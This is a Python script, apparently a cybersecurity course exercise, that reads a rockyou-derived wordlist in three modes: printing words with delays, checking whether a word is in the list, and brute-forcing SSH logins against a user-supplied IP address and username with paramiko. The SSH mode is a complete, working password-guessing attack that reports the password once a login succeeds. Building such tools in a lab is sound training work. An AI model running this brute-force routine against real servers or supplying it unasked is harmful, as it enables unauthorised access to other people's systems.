#!/usr/bin/env python3
# Script Name:                  Ops 17: Automated Brute Force Wordlist Attack Tool Part 2 of 3
# Author:                       Juan Miguel Cano
# Date of latest revision:      01/29/2024      
# Purpose:                      Provides two modes for interacting with a word list file, allwoing users to
# Purpose cont:                 either iterate through the list with delays (simulating a dictionary attack), 
# Purpose cont:                 search for specific words within the list, or Authenticat to an SSH server by its IP address
# Resources:                    https://chat.openai.com/share/34f8b3b6-f1a9-48f1-b2ea-c60fa5efebaf                   

import time
import paramiko

# Function to perform Mode 1: Offensive; Dictionary Iterator
def offensive_mode(file_path):
   delay = float(input("Enter the delay between words (in seconds): "))
   max_lines = int(input("Enter the maximum number of lines to display: "))
   line_count = 0
   try:
        with open(file_path, 'r') as file:  # Open in text mode ('r')
           while True:
                word = file.readline().strip()
                if not word:
                    break
                print(word)
                line_count += 1
                if line_count >= max_lines:
                    break  # Stop displaying after reaching the maximum lines
                time.sleep(delay)
   except FileNotFoundError:
        print("File not found.")

# Function to perform Mode 2: Defensive; Password Recognized
def defensive_mode(file_path):
    user_input = input("Enter a word to search: ")
    try:
        with open(file_path, 'r', errors='ignore') as file:  # Open in text mode ('r') and ignore decoding errors
            while True:
                line = file.readline()
                if not line:
                    break
                word = line.strip()
                if user_input == word:
                    print("The word is in the word list.")
                    return
            print("The word is not in the word list.")
    except FileNotFoundError:
        print("File not found.")
                                                              
# Function to perform SSH brute force using the wordlist
def ssh_brute_force(file_path, ip_address, username):
    try:
        with open(file_path, 'r') as file:
            for word in file:
                password = word.strip()
                print(f"Trying password: {password}")

                #SSH Connection
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                try:
                    ssh.connect(ip_address, username=username, password=password)
                    print(f"Login successful for password: {password}")
                    return
                except paramiko.AuthenticationException:
                    print("Authentication failed. Trying next password.")

                ssh.close()
                time.sleep(1) # Add a delay of 1 second (adjust as needed)
    except FileNotFoundError:
        print("File not found")

if __name__ == "__main__":
   mode = input("Select a mode (1 for Offensive, 2 for Defensive, 3 for SSH Brute Force): ")
   file_path = "smaller_rockyou.txt"  # Use the smaller wordlist file as the wordlist

   if mode == '1':
        offensive_mode(file_path)
   elif mode == '2':
        defensive_mode(file_path)
   elif mode == '3':
       ip_address = input("Enter the IP address of the SSH server: ")
       username = input("Enter the SSH username: ")
       ssh_brute_force(file_path, ip_address, username)
   else:
        print("Invalid mode selection. Please choose 1 or 2, or 3.")
